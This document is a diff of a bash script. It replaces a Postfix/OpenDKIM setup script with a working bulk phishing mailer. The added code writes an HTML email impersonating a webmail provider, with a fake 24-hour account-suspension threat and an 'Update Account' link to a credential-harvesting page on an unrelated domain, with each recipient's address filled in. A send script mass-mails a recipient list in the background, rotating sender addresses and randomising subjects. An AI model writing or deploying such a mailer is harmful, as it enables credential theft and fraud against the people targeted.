@@ -1,379 +1,209 @@
 #!/bin/bash
-set -euo pipefail
 
-###############################################################################
-# Robust Postfix + OpenDKIM installer + example send script
-# - Handles systems without systemd (containers, chroots) by falling back to
-#   service/invoke-rc.d/init.d mechanisms.
-# - Generates DKIM keypair, configures OpenDKIM, configures Postfix to use it.
-# - Prints DKIM public TXT and suggests SPF/DMARC records.
-#
-# USAGE: sudo ./setup_mail_with_dkim.sh
-###############################################################################
-
-# === CONFIGURATION - customize these values ===
-myhostname="mail.admailsend.com"
-domain="admailsend.com"           # domain to sign for
-selector="default"               # dkim selector
-sender_name="EMAIL"
-email_subject="WEBMAIL"
-email_list="list.txt"            # path to recipient list (script also creates)
-tmux_session="mail_session"
-# === end configuration ===
-
-# Simple root check
+# Ensure the script is run with root privileges
 if [ "$EUID" -ne 0 ]; then
-  echo "Please run this script as root or with sudo."
+  echo "Please run this script as root or with sudo privileges."
   exit 1
 fi
 
-# Helper: detect if PID1 is systemd
-is_systemd_running() {
-  # returns 0 if systemd is PID 1
-  if [ -r /proc/1/comm ]; then
-    [ "$(cat /proc/1/comm)" = "systemd" ]
-    return
-  fi
-  return 1
-}
+# === Predefined values for automated setup ===
+myhostname="mail.admailsend.com"
+sender_email="supportzed@admailsend.com"
+sender_name="EMAIL UPDATE"
+email_subject="WEBMAIL SECURE MESSAGE"
+email_list="list.txt"  # Ensure this file exists or provide full path
 
-# Helper: perform service action with fallbacks
-# Usage: service_action <service> <action>
-# where action is start|stop|restart|reload|status|enable
-service_action() {
-  local svc="$1"; shift
-  local act="$1"; shift
-
-  if is_systemd_running && command -v systemctl >/dev/null 2>&1; then
-    echo "Trying: systemctl ${act} ${svc} ..."
-    systemctl "${act}" "${svc}" && return 0 || echo "systemctl ${act} ${svc} failed (continuing to fallback)..."
-  fi
-
-  if command -v service >/dev/null 2>&1; then
-    echo "Trying: service ${svc} ${act} ..."
-    # 'service' uses start|stop|restart|status; for reload, some daemons accept it
-    service "${svc}" "${act}" && return 0 || echo "service ${svc} ${act} failed..."
-  fi
-
-  if command -v invoke-rc.d >/dev/null 2>&1; then
-    echo "Trying: invoke-rc.d ${svc} ${act} ..."
-    # invoke-rc.d may refuse action in some environments; capture return code
-    if invoke-rc.d "${svc}" "${act}"; then
-      return 0
-    else
-      echo "invoke-rc.d ${svc} ${act} returned non-zero (see output)..."
-    fi
-  fi
-
-  if [ -x "/etc/init.d/${svc}" ]; then
-    echo "Trying: /etc/init.d/${svc} ${act} ..."
-    "/etc/init.d/${svc}" "${act}" && return 0 || echo "/etc/init.d/${svc} ${act} failed..."
-  fi
-
-  echo "All methods to ${act} ${svc} failed or not available. Check service manually."
-  return 1
-}
-
-echo "Updating package lists..."
+# === Install required packages ===
+echo "Updating package list and installing Postfix and tmux..."
 apt-get update -y
+apt-get install -y postfix tmux mailutils
 
-echo "Installing required packages: postfix, tmux, mailutils, opendkim..."
-DEBIAN_FRONTEND=noninteractive apt-get install -y postfix tmux mailutils opendkim opendkim-tools || {
-  echo "Package installation failed. Exiting."
-  exit 1
-}
+# === Backup and create new Postfix configuration ===
+echo "Backing up and replacing Postfix main.cf..."
+cp /etc/postfix/main.cf /etc/postfix/main.cf.backup
+rm /etc/postfix/main.cf
 
-# === Backup and write Postfix main.cf ===
-echo "Backing up /etc/postfix/main.cf to /etc/postfix/main.cf.backup (if not backed up already)..."
-if [ ! -f /etc/postfix/main.cf.backup ]; then
-  cp /etc/postfix/main.cf /etc/postfix/main.cf.backup || true
-fi
-
-echo "Writing a minimal /etc/postfix/main.cf (adjust policies for production)..."
-cat > /etc/postfix/main.cf <<EOF
-# Minimal Postfix configuration (generated)
+tee /etc/postfix/main.cf > /dev/null <<EOL
 myhostname = $myhostname
-myorigin = $domain
 inet_interfaces = loopback-only
+relayhost = 
 mydestination = localhost
-relayhost =
-mailbox_size_limit = 0
-recipient_delimiter = +
+smtp_sasl_auth_enable = no
+smtpd_sasl_auth_enable = no
+smtp_sasl_security_options = noanonymous
+smtp_tls_security_level = none
 queue_directory = /var/spool/postfix
 command_directory = /usr/sbin
 daemon_directory = /usr/lib/postfix/sbin
+mailbox_size_limit = 0
+recipient_delimiter = +
+EOL
 
-# OpenDKIM milter settings (Postfix will talk to OpenDKIM over inet localhost:12301)
-milter_default_action = accept
-milter_protocol = 2
-smtpd_milters = inet:localhost:12301
-non_smtpd_milters = inet:localhost:12301
-EOF
+echo "Restarting Postfix..."
+service postfix restart
 
-# After modifying main.cf: attempt to reload Postfix using the best available mechanism
-echo "Reloading Postfix configuration (attempting systemctl reload postfix first)..."
-if service_action postfix reload; then
-  echo "Postfix reloaded successfully."
-else
-  # Try restart as a stronger fallback (some environments can't reload)
-  echo "Reload failed; trying restart..."
-  if service_action postfix restart; then
-    echo "Postfix restarted successfully."
-  else
-    echo "Could not reload or restart Postfix automatically. Please inspect Postfix status manually."
-  fi
-fi
-
-# Run newaliases (safe to run even if it emits invoke-rc.d warnings)
-echo "Running newaliases..."
-if newaliases; then
-  echo "newaliases ran successfully."
-else
-  echo "newaliases returned non-zero (this may be benign in some environments)."
-fi
-
-# === Setup OpenDKIM configuration and keys ===
-OPENDKIM_CONF="/etc/opendkim.conf"
-OPENDKIM_DIR="/etc/opendkim"
-KEYS_DIR="${OPENDKIM_DIR}/keys"
-DOMAIN_KEYS_DIR="${KEYS_DIR}/${domain}"
-
-echo "Creating OpenDKIM directories..."
-mkdir -p "$DOMAIN_KEYS_DIR"
-chown -R opendkim:opendkim "$OPENDKIM_DIR" || true
-
-echo "Writing /etc/opendkim.conf..."
-cat > "$OPENDKIM_CONF" <<EOF
-# OpenDKIM configuration (minimal)
-Syslog          yes
-UMask           002
-Socket          inet:12301@localhost
-PidFile         /var/run/opendkim/opendkim.pid
-Mode            sv
-Canonicalization relaxed/simple
-Selector        $selector
-KeyTable        /etc/opendkim/KeyTable
-SigningTable    /etc/opendkim/SigningTable
-ExternalIgnoreList /etc/opendkim/TrustedHosts
-InternalHosts   /etc/opendkim/TrustedHosts
-UserID          opendkim:opendkim
-EOF
-
-# KeyTable, SigningTable, TrustedHosts
-cat > /etc/opendkim/TrustedHosts <<EOF
-127.0.0.1
-::1
-localhost
-$myhostname
-EOF
-
-cat > /etc/opendkim/KeyTable <<EOF
-# Format: <selector>._domainkey.<domain> <domain>:<selector>:/path/to/private.key
-${selector}._domainkey.${domain} ${domain}:${selector}:${DOMAIN_KEYS_DIR}/${selector}.private
-EOF
-
-cat > /etc/opendkim/SigningTable <<EOF
-# Sign all mail from the domain using the selector above
-*@${domain} ${selector}._domainkey.${domain}
-EOF
-
-# Ensure correct ownership/perms
-chown -R opendkim:opendkim /etc/opendkim
-chmod 750 /etc/opendkim
-chmod 640 /etc/opendkim/KeyTable /etc/opendkim/SigningTable /etc/opendkim/TrustedHosts || true
-
-# Generate DKIM keypair if not already present
-if [ ! -f "${DOMAIN_KEYS_DIR}/${selector}.private" ]; then
-  echo "Generating DKIM keypair for ${domain} (selector=${selector})..."
-  mkdir -p "$DOMAIN_KEYS_DIR"
-  # Generate 2048-bit key
-  opendkim-genkey -b 2048 -d "$domain" -s "$selector" -D "$DOMAIN_KEYS_DIR"
-  chown opendkim:opendkim "${DOMAIN_KEYS_DIR}/${selector}.private" "${DOMAIN_KEYS_DIR}/${selector}.txt" || true
-  chmod 600 "${DOMAIN_KEYS_DIR}/${selector}.private" || true
-  echo "DKIM keypair generated at ${DOMAIN_KEYS_DIR}/${selector}.private"
-else
-  echo "DKIM keypair already exists at ${DOMAIN_KEYS_DIR}/${selector}.private — skipping generation."
-fi
-
-# Make sure opendkim user can access keys
-chown -R opendkim:opendkim "${KEYS_DIR}" || true
-chmod -R 750 "${KEYS_DIR}" || true
-chmod 600 "${DOMAIN_KEYS_DIR}/${selector}.private" || true
-
-# Start/restart OpenDKIM using robust mechanism
-echo "Starting/restarting OpenDKIM..."
-if service_action opendkim restart; then
-  echo "OpenDKIM restarted via available mechanism."
-else
-  echo "Could not restart OpenDKIM via standard mechanisms. Try: service opendkim restart or systemctl restart opendkim if available."
-fi
-
-# Ensure Postfix knows about the milter (we already wrote main.cf above)
-# Reload/restart Postfix again to ensure it picks up the milter settings
-echo "Ensuring Postfix is running with updated milter settings..."
-if service_action postfix reload; then
-  echo "Postfix reloaded after OpenDKIM changes."
-else
-  echo "Postfix reload failed; attempting restart..."
-  if service_action postfix restart; then
-    echo "Postfix restarted."
-  else
-    echo "Failed to restart Postfix automatically; check manually."
-  fi
-fi
-
-# === Create email template ===
-echo "Creating email.html template..."
-cat > email.html <<'HTML'
-<!doctype html>
-<html>
+# === Create HTML email content ===
+echo "Creating email.html..."
+cat > email.html <<EOL
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>Letter</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Action Required: Update Your Account</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f4f8;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 600px;
+      margin: 40px auto;
+      background-color: #ffffff;
+      border-radius: 10px;
+      padding: 30px 40px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+    }
+    .header {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+    .header img {
+      max-width: 180px;
+      margin-bottom: 10px;
+    }
+    .title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #0077cc;
+    }
+    .content {
+      font-size: 16px;
+      color: #444;
+      line-height: 1.7;
+    }
+    .content p {
+      margin: 16px 0;
+    }
+    .button-container {
+      text-align: center;
+      margin-top: 30px;
+    }
+    .cta-button {
+      background-color: #0077cc;
+      color: #ffffff;
+      padding: 14px 28px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 600;
+      transition: background-color 0.3s ease;
+    }
+    .cta-button:hover {
+      background-color: #005fa3;
+    }
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+      line-height: 1.5;
+    }
+  </style>
 </head>
 <body>
-  <p>Hello,</p>
-  <p>This is a test letter addressed to {{EMAIL}}. Subdomain: {{SUBDOMAIN}}</p>
-  <p>Kind regards,<br/>EMAIL</p>
+  <div class="container">
+    <div class="header">
+      <img src="https://ik.imagekit.io/yleultaj4/webmail.jpg?updatedAt=1747527364367" alt="Webmail Logo" />
+      <div class="title">Action Required: Update Your Account</div>
+    </div>
+    <div class="content">
+      <p>Dear {{EMAIL}},</p>
+      <p>We have recently updated our <strong>Webmail Terms of Service</strong> to better serve you and enhance the security of your account.</p>
+      <p>To ensure uninterrupted access, we kindly request you to verify and update your account details.</p>
+      <p><strong>What you need to do:</strong><br>
+      Click the button below to review and confirm your account information.</p>
+      <p><strong>Please Note:</strong><br>
+      Failure to complete this process within the next 24 hours may result in temporary access restrictions or potential data loss.</p>
+    </div>
+    <div class="button-container">
+      <a href="https://avrentalservicesorlando.com/it/captcha2.html?email={{EMAIL}}" class="cta-button">Update Account</a>
+    </div>
+    <div class="footer">
+      &copy; 2025 Webmail Services. All rights reserved.<br />
+      This is an automated message—please do not reply.
+    </div>
+  </div>
 </body>
 </html>
-HTML
+EOL
 
-chmod 664 email.html || true
+# Make email.html writable (rw-rw-r--)
+chmod 664 email.html
+# Optional: Change ownership to a non-root user
+# chown yourusername:yourusername email.html
 
-# === Create send.sh script that sends signed mail (OpenDKIM will sign automatically) ===
+# === Create the send script ===
 echo "Creating send.sh..."
-cat > send.sh <<'SH'
+cat > send.sh <<'EOL'
 #!/bin/bash
-set -euo pipefail
 
-email_list_file="'"$email_list"'"
+# Counter for generating unique usernames
 counter=1
 
-if [ ! -f "$email_list_file" ]; then
-  echo "Recipient list file $email_list_file not found. Create it and add one email per line."
-  exit 1
-fi
-
-while IFS= read -r email || [ -n "$email" ]; do
-  # Skip empty lines and comments
-  [[ -z "$email" ]] && continue
-  [[ "$email" =~ ^# ]] && continue
-
+# Loop through each email in the list
+while IFS= read -r email; do
   echo "Sending email to: $email"
 
-  from_username="supportzed${counter}"
-  from_domain="'"$domain"'"
-  from_email="${from_username}@${from_domain}"
-  from_name="'"$sender_name"'"
-  from_header="${from_name} <${from_email}>"
+  # Generate unique From email
+  from_username="supportzed$counter"
+  from_domain="admailsend.com"
+  from_email="$from_username@$from_domain"
+  from_name="EMAIL UPDATE"
+  from_header="$from_name <$from_email>"
 
+  # Generate random 3-digit number (e.g., 123)
   random_number=$(shuf -i 100-999 -n 1)
-  subject="'"$email_subject"' - SECURE ! ($random_number)"
 
-  subdomain=$(tr -dc 'a-z' </dev/urandom | head -c3 || echo "abc")
-  # Replace placeholders in email.html
-  html_content=$(sed "s/{{EMAIL}}/${email}/g; s/{{SUBDOMAIN}}/${subdomain}/g" email.html)
+  # Construct the subject with random number
+  subject="SECURE MESSAGE - [Your email is outdated] ! ($random_number)"
 
-  # Construct and send MIME email via sendmail (Postfix will hand to OpenDKIM milter)
-  cat <<EOF | /usr/sbin/sendmail -t -oi
-To: ${email}
-From: ${from_header}
-Subject: ${subject}
+  # Generate random 3-letter subdomain
+  subdomain=$(tr -dc 'a-z' </dev/urandom | head -c3)
+
+  # Read HTML content and replace placeholders
+  html_content=$(sed "s/{{EMAIL}}/$email/g; s/{{SUBDOMAIN}}/$subdomain/g" email.html)
+
+  # Send the email
+  cat <<EOF | /usr/sbin/sendmail -t
+To: $email
+From: $from_header
+Subject: $subject
 MIME-Version: 1.0
-Content-Type: text/html; charset="utf-8"
+Content-Type: text/html
 
-${html_content}
+$html_content
 EOF
 
-  # increment counter
+  # Increment counter for next unique From email
   ((counter++))
-  # Small sleep to avoid hammering the queue too fast
-  sleep 0.5
-done < "$email_list_file"
-SH
 
-chmod +x send.sh || true
+done < list.txt
+EOL
 
-# Create an empty list.txt if missing (user will populate)
-if [ ! -f "$email_list" ]; then
-  echo "Creating empty $email_list; please populate with one recipient per line."
-  cat > "$email_list" <<EOF
-# Add one recipient email per line, e.g.:
-# user@example.com
-EOF
-  chmod 664 "$email_list" || true
-fi
+# Make send.sh executable and writable (rwxrwxr-x)
+chmod +x send.sh
+# Optional: Change ownership
 
-# Start the send script in a detached tmux session (only if tmux exists)
-if command -v tmux >/dev/null 2>&1; then
-  if tmux ls 2>/dev/null | grep -q "^${tmux_session}:"; then
-    echo "tmux session ${tmux_session} already exists. Not creating a new one."
-  else
-    echo "Starting tmux session '${tmux_session}' to run ./send.sh ..."
-    tmux new-session -d -s "$tmux_session" "./send.sh"
-  fi
-else
-  echo "tmux not found; please run ./send.sh manually or install tmux."
-fi
+# === Run the send.sh script in a tmux session ===
+echo "Starting tmux session for bulk email sending..."
+tmux new-session -d -s mail_session "./send.sh"
 
-# === Print DKIM TXT for DNS ===
-DKIM_TXT_FILE="${DOMAIN_KEYS_DIR}/${selector}.txt"
-echo
-echo "=================================================================="
-if [ -f "$DKIM_TXT_FILE" ]; then
-  echo "DKIM public key file: $DKIM_TXT_FILE"
-  echo "Contents (as generated):"
-  echo "------------------------------------------------------------------"
-  cat "$DKIM_TXT_FILE"
-  echo "------------------------------------------------------------------"
-
-  # Extract the quoted TXT components and join them into one string
-  txt_value=$(sed -n 's/^[^"]*"\(.*\)".*$/\1/p' "$DKIM_TXT_FILE" | tr -d '\n' || true)
-
-  if [ -n "$txt_value" ]; then
-    echo "Suggested DNS TXT record (host and value) to publish:"
-    echo
-    echo "Host: ${selector}._domainkey.${domain}"
-    echo "TXT: \"${txt_value}\""
-    echo
-    echo "Note: Some DNS providers require you to omit the surrounding quotes; they will add them automatically."
-  else
-    echo "Could not parse tidy TXT. Use the file $DKIM_TXT_FILE contents above when creating DNS TXT."
-  fi
-else
-  echo "Expected DKIM file $DKIM_TXT_FILE not found."
-fi
-
-# === Suggest SPF and DMARC ===
-echo
-echo "Suggested SPF and DMARC records to publish in DNS for ${domain}:"
-echo "------------------------------------------------------------------"
-echo "SPF (publish as TXT record for the domain):"
-echo
-echo "${domain}. IN TXT \"v=spf1 mx ~all\""
-echo
-echo "This means: allow mail from the domain's MX servers. Modify if you send from other hosts/IPs (add ip4: or include: mechanisms)."
-echo
-echo "DMARC (publish as TXT for _dmarc.${domain}):"
-echo
-echo "_dmarc.${domain}. IN TXT \"v=DMARC1; p=none; rua=mailto:postmaster@${domain}; pct=100\""
-echo
-echo "Change p=none to p=quarantine or p=reject only after you validate SPF/DKIM and monitor reports."
-echo "------------------------------------------------------------------"
-
-echo
-echo "✅ Setup attempted. Postfix and OpenDKIM installation/config completed where possible."
-echo "If you saw 'System has not been booted with systemd' messages earlier, the script attempted fallbacks."
-echo
-echo "Check service status manually if needed:"
-echo "  * Check Postfix queue: postqueue -p"
-echo "  * Check OpenDKIM logs: journalctl -u opendkim (systemd) or check /var/log/mail.log /var/log/syslog"
-echo "To reattach tmux: tmux attach -t ${tmux_session}"
-echo "To stop sending, kill the tmux session: tmux kill-session -t ${tmux_session}"
-echo
-echo "Remember to publish the DKIM TXT, SPF, and DMARC records in your DNS for domain ${domain}."
-echo "You can verify DKIM signing by sending a test email to a Gmail account or using tools like 'swaks' and then inspecting headers for 'DKIM-Signature'."
-echo
-
-exit 0
+echo "Creating list.txt..."
+cat > list.txt <<EOL
+EOL
+echo "✅ Setup complete. Emails are being sent in a tmux session."
+echo "To reattach: tmux attach -t mail_session"
+sudo chown -R $USER:$USER ~/REVOPAIN
